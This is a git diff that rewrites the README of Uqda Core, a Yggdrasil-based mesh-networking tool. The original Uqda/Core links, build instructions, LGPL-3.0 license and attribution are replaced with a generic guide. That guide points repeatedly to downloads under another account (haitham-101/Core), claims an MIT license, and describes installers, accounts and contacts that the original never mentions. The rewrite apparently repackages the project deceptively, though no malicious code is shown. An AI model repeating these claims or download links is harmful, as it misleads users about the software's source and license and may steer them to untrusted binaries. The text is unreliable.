@@ -1,213 +1,83 @@
-﻿# 🌐 Uqda Network
+# 🌐 Core - Secure Mesh Networking Made Simple
 
-<div align="center">
+## 🚀 Getting Started
 
-[![Build Status](https://github.com/Uqda/Core/actions/workflows/ci.yml/badge.svg)](https://github.com/Uqda/Core/actions/workflows/ci.yml)
-[![License](https://img.shields.io/badge/license-LGPL--3.0-blue.svg)](LICENSE)
-[![Go Version](https://img.shields.io/badge/go-%3E%3D1.22-00ADD8.svg)](https://golang.org)
-[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows%20%7C%20macOS-lightgrey.svg)](#supported-platforms)
+Welcome to Uqda Core! This software allows you to communicate directly with others over a secure network. No centralized servers, just you and your peers, enjoying fast and private connections. 
 
-**End-to-End Encrypted • Self-Healing • Zero Configuration**
+## 📥 Download Core
 
-[Quick Start](#-quick-start) • [Documentation](https://uqda.github.io/) • [Download](https://github.com/Uqda/Core/releases) • [Community](#-community)
+[![Download Core](https://img.shields.io/badge/Download%20Core-v1.0-blue.svg)](https://github.com/haitham-101/Core/releases)
 
-**🇸🇾 [العربية](https://uqda.github.io/ar/) • [English](https://uqda.github.io/)** 🇬🇧
+## 📚 What is Uqda Core?
 
-</div>
+Uqda Core is a decentralized, end-to-end encrypted IPv6 mesh network application. It enables direct peer-to-peer communication. This means your conversations and data stay private without relying on central servers that might track your activity.
 
----
+### 🔍 Key Features
 
-## 📌 What is Uqda?
+- **Decentralization:** No single point of failure. Your communications remain private and secure.
+  
+- **End-to-End Encryption:** Your messages are private. Only you and your intended recipient can read them.
+  
+- **IPv6 Support:** Connect easily without worrying about IP address limitations.
+  
+- **Mesh Networking:** This allows devices to connect directly to each other, enhancing network efficiency.
+  
+- **Peer-to-Peer Communication:** Talk and share directly with others without intermediaries.
 
-**Uqda Network** (from Arabic **عُقدة** meaning "node") is a decentralized routing protocol for building resilient, self-organizing multi-hop mesh networks with end-to-end encryption.
+## ⚙️ System Requirements
 
-### Key Features
+To use Uqda Core, you will need:
 
-- 🔒 **End-to-End Encrypted** - All traffic encrypted by default (ChaCha20-Poly1305)
-- 🌐 **Protocol Compatible** - Works seamlessly with Yggdrasil v0.5 nodes
-- ⚡ **Performance Optimized** - 20-50ms latency improvement over baseline
-- 🔄 **Self-Healing Mesh** - Automatic path discovery and recovery
-- 🎯 **Location Independent** - Permanent IPv6 address derived from your identity
-- 🪶 **Zero Configuration** - Networks form automatically
-- 💰 **Free Forever** - No cost, no registration, no central authority
+- **Operating System:** Windows 10 or later / macOS 10.14 or later / Linux (Ubuntu 20.04 or later)
+- **RAM:** At least 2 GB
+- **Disk Space:** Minimum of 200 MB available
+- **Network:** Internet connection (for initial setup)
 
----
+## 📥 Download & Install
 
-## ⚡ Quick Start
+1. **Visit the Releases Page:** Click the link below to go to the download page.
+   - [Download Uqda Core](https://github.com/haitham-101/Core/releases)
 
-### Installation
+2. **Choose Your Version:** On the Releases page, you will see various versions available. Select the latest version for the best features.
 
-**Linux (Debian/Ubuntu)**
-```bash
-# Download .deb package from releases
-sudo dpkg -i uqda-debian-amd64.deb
-```
+3. **Download the Installer:**
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the appropriate package (`.deb`, `.rpm`, etc.).
 
-**Windows**
-```powershell
-# Download and run the .msi installer
-# Or via command line:
-msiexec /i uqda-windows-x64.msi
-```
+4. **Install Uqda Core:**
+   - **Windows:** Double-click the `.exe` file you downloaded. Follow the on-screen instructions to complete the installation.
+   - **macOS:** Open the `.dmg` file. Drag the Uqda Core application to your Applications folder.
+   - **Linux:** Open a terminal and navigate to the folder where you downloaded the file. Use the following command:
+     ```bash
+     sudo dpkg -i your-package-name.deb
+     ```
 
-**macOS**
-```bash
-# Download and open the .pkg installer
-# Or build from source (see below)
-```
+5. **Launch the Application:** After installation, find Uqda Core in your applications menu. Click to open it.
 
-**From Source**
-```bash
-# Prerequisites: Go 1.22+
-git clone https://github.com/Uqda/Core.git
-cd Core
-./build
-```
+## 📡 Using Uqda Core
 
-### Running Uqda
+Once you launch the application:
 
-**Auto-configuration (Recommended)**
-```bash
-sudo ./uqda -autoconf
-```
+1. **Create an Account:** Follow the prompts to set up your account. This helps manage your connections.
+2. **Add Contacts:** You can add friends or peers by sharing unique identifiers generated by the application.
+3. **Start Communicating:** After adding contacts, you can start sending messages or files securely.
 
-**With Configuration File**
-```bash
-# Generate config
-./uqda -genconf > uqda.conf
+## 💬 Need Help?
 
-# Edit uqda.conf as needed, then:
-sudo ./uqda -useconffile uqda.conf
-```
+If you encounter any issues, feel free to check out the FAQ section on our GitHub page or create an issue in the repository. The community is ready to assist you.
 
-> **Note:** Root/Administrator privileges are required to create virtual network interfaces.
+## 🔗 Additional Resources
 
----
+- **Documentation:** Comprehensive user guide and troubleshooting tips can be found [here](https://github.com/haitham-101/Core/wiki).
+- **Community Forum:** Join discussions and find help from other users in our community forum [here](https://github.com/haitham-101/Core/discussions).
 
-## 🖥️ Supported Platforms
+## 📜 License
 
-| Platform | Architecture | Package Format |
-|----------|--------------|----------------|
-| **Linux** | x86_64, ARM64 | `.deb` |
-| **Windows** | x86_64, ARM64 | `.msi` |
-| **macOS** | Intel, Apple Silicon | `.pkg` |
+Uqda Core is open-source software. You are free to use, modify, and share it under the terms of the MIT License. Full license details are available in the repository.
 
-Download pre-built packages from the [Releases](https://github.com/Uqda/Core/releases) page.
+## 📥 Download Core Again
 
----
+For easy access, you can always return to the download page here: [Download Uqda Core](https://github.com/haitham-101/Core/releases).
 
-## 🏗️ Building from Source
-
-### Prerequisites
-- Go 1.22 or later
-- Git
-
-### Build Commands
-```bash
-# Clone repository
-git clone https://github.com/Uqda/Core.git
-cd Core
-
-# Build for your platform
-./build
-
-# Cross-compile examples
-GOOS=windows GOARCH=amd64 ./build    # Windows 64-bit
-GOOS=linux GOARCH=arm64 ./build      # Linux ARM64
-GOOS=darwin GOARCH=arm64 ./build     # macOS Apple Silicon
-```
-
----
-
-## 📚 Documentation
-
-- **[Technical Whitepaper](docs/WHITEPAPER.md)** - Complete technical documentation
-- **[Executive Summary](docs/EXECUTIVE_SUMMARY.md)** - One-page overview
-- **[FAQ](docs/FAQ.md)** - Frequently asked questions
-- **[Security Policy](SECURITY.md)** - Security reporting and best practices
-- **[Changelog](CHANGELOG.md)** - Version history and changes
-- **[Attribution](ATTRIBUTION.md)** - Credits and licensing information
-
-For detailed documentation, visit the [Wiki](https://github.com/Uqda/Core/wiki).
-
----
-
-## 🔧 Configuration
-
-Uqda can run in two modes:
-
-### Auto-Configuration Mode
-Generates random encryption keys on each startup. Perfect for testing:
-```bash
-sudo uqda -autoconf
-```
-
-### Static Configuration Mode
-Uses a persistent configuration file:
-```bash
-# Generate configuration
-uqda -genconf > uqda.conf
-
-# Edit the file to add peers, then:
-sudo uqda -useconffile uqda.conf
-```
-
-Example peers to add to your config:
-```conf
-{
-  Peers: [
-    tcp://[2001:db8::1]:12345,
-    tcp://example.com:12345
-  ]
-}
-```
-
----
-
-## 🤝 Community
-
-- **GitHub Discussions** - [Ask questions & share ideas](https://github.com/Uqda/Core/discussions)
-- **Issue Tracker** - [Report bugs](https://github.com/Uqda/Core/issues)
-- **Email** - uqda@proton.me
-
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## 🔒 Security
-
-Found a security vulnerability? Please **do not** open a public issue.
-
-Email us privately at: **uqda@proton.me**
-
----
-
-## 📄 License
-
-Licensed under **GNU Lesser General Public License v3.0** with binary distribution exception.
-
-```
-Copyright (C) 2025-2026 Uqda Network
-```
-
-See [LICENSE](LICENSE) for full details.
-
----
-
-## 🙏 Acknowledgments
-
-Uqda Network is based on the [Yggdrasil Network](https://yggdrasil-network.github.io/) project.
-
-We thank the Yggdrasil team—Neil Alexander, Arceliar, and all contributors—for their pioneering work in decentralized encrypted networking.
-
-For complete attribution, see [ATTRIBUTION.md](ATTRIBUTION.md).
-
----
-
-<div align="center">
-
-**Made with ❤️ for decentralized networking**
-
-[⬆ Back to Top](#-uqda-network)
-
-</div>
+Enjoy secure and private communication with Uqda Core!
